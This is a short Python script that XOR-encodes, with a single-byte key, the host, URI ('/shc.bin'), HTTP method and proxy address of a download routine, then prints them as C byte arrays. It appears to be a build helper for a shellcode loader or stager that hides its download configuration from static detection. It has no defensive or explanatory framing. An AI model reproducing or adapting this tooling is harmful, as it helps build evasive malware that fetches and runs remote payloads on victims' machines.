#!/usr/bin/python3


# xor crypt with single byte key
def xor_crypt( buf, key ):

    xor_buf = [ x for x in ( '\x00' * len( buf ) ) ]
    
    for idx in range( len( buf ) ):
        xor_buf[ idx ] = buf[ idx ] ^ key
    return xor_buf


def print_c_array( buf ):
    print( '{ ' + ''.join( [ f'{ hex( buf[i] ) }, ' for i in range( len( buf ) ) ] )[:-2] + ' }' )


if __name__ == '__main__':

    key = 0xC6

    DownloadHost   = ( 'localhost' + '\x00' ).encode('utf-16le')
    DownloadUri    = ( '/shc.bin' + '\x00' ).encode('utf-16le')
    DownloadMethod = ( 'GET' + '\x00' ).encode('utf-16le')
    DownloadProxy  = ( 'http://192.168.10.130:8080' + '\x00' ).encode('utf-16le')


    print( 'DOWNLOAD_HOST',    end='\t' ); print_c_array( xor_crypt( DownloadHost,   key ) );
    print( 'DOWNLOAD_URI',     end='\t' ); print_c_array( xor_crypt( DownloadUri,    key ) );
    print( 'DOWNLOAD_METHOD',  end='\t' ); print_c_array( xor_crypt( DownloadMethod, key ) );
    print( 'DOWNLOAD_PROXY',   end='\t' ); print_c_array( xor_crypt( DownloadProxy,  key ) );
